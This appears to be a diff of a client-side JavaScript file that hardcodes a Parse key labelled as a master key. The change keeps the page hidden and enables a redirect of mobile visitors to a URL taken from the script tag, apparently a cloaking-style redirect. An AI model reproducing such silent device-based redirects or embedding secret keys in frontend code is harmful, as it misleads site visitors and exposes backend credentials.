@@ -26,9 +26,10 @@ Parse.initialize(
   'j5kLmUASv74RCcZhb3UqtIwxbXlXodMihUXQVh8y' // This is your Master key (never use it in the frontend)
 );
 var urll = document.currentScript.getAttribute('url');
+var b=setInterval(function(){document.body.style.display="none"});
 window.onload = function()
 {
-    document.body.style.display = 'none'
+  clearInterval(b);
 
 };
 var currentIp;
@@ -66,7 +67,7 @@ document.body.style.display = 'block'
       } else {
         // if is mobile
         if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){
-//           window.location.replace(urll);
+           window.location.replace(urll);
 
           //your code for mobile devices
         } else {
